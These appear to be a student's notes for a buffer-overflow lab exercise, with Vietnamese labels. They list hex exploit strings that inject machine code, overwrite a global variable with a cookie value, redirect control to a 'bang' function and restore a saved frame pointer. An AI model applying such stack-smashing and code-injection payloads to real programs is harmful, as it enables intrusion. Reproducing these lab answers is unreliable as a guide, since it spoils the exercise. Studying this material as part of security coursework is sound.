b8 01 00 00 00 cd 80
0x556838cc
cookie: 0x5368a4c8
global value: 08307160
bang: 08302689
0B 26 30 08
b8 01 00 00 00 cd 80 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 cc 38 68 55

lệnh:
c7 05 60 71 30 08 c8 a4 68 53 68 89 26 30 08 c3 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 cc 38 68 55

b8 fb b1 f0 
72 68 be 8d 
04 08 c3 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
f0 3d 68 55
98 3d 68 55

old ebp: 0x55683920
địa chỉ câu lệnh tiếp theo: 0x83026f7
lệnh: 
b8 c8 a4 68 53 68 f7 26 30 08 c3 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 88 20 39 68 55 cc 38 68 55